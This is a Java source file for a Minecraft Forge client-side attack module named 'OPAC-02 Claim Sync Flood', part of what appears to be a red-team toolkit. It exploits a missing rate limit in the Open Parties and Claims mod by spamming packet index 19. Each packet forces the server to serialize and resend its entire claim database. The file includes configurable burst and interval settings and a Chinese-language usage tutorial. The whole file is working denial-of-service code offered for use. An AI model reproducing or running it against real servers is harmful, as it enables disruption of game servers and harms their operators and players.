package com.redblue.red.modules.opac;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * OPAC-02: Claim Sync Flood -- exploits zero rate limit on
 * ClaimRegionsStartPacket (index 19).
 *
 * Each packet triggers 4 full sync operations:
 *   1. ClaimOwnerPropertiesSync.start()
 *   2. SubClaimPropertiesSync.start()
 *   3. ClaimStateSync.start()
 *   4. ClaimRegionSync.start()
 *
 * No rate limit whatsoever. Spamming forces server to repeatedly
 * serialize and send the entire claim database to this player,
 * consuming CPU for serialization and bandwidth for transmission.
 * On servers with large claim databases this is devastating.
 */
public class OPAC02_SyncFlood implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("openpartiesandclaims", "main");
    private static final int IDX_CLAIM_REGIONS_START = 19;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("interval", "发包间隔 (tick)", 1, 1, 20),
        ConfigParam.ofInt("burst", "每次突发数量", 1, 1, 20)
    );

    @Override public String id() { return "opac02_sync_flood"; }
    @Override public String name() { return "领地同步洪泛"; }
    @Override public String description() { return "无速率限制的领地全量同步请求，消耗服务器CPU和带宽"; }

    @Override
    public String getTutorial() {
        return "[原理]\n"
            + "ClaimRegionsStartPacket (ID 19) 完全没有速率限制\n"
            + "每个包触发4个完整同步操作，服务器必须序列化整个领地数据库\n"
            + "在领地数据量大的服务器上效果显著\n\n"
            + "[使用方法]\n"
            + "1. 启用模块，自动以tick循环发送\n"
            + "2. 或点击「执行」单次触发\n\n"
            + "[参数]\n"
            + "发包间隔: 每N个tick发一次\n"
            + "突发数量: 每次发送的包数量";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("openpartiesandclaims");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        int burst = getParam("burst").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < burst; i++) {
            sendSyncPacket();
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        int burst = getParam("burst").map(ConfigParam::getInt).orElse(1);
        for (int i = 0; i < burst; i++) {
            sendSyncPacket();
        }
    }

    private void sendSyncPacket() {
        // Wire format: discriminator byte + empty CompoundTag via writeNbt
        CompoundTag tag = new CompoundTag();
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_CLAIM_REGIONS_START);
            buf.writeNbt(tag);
        });
    }
}
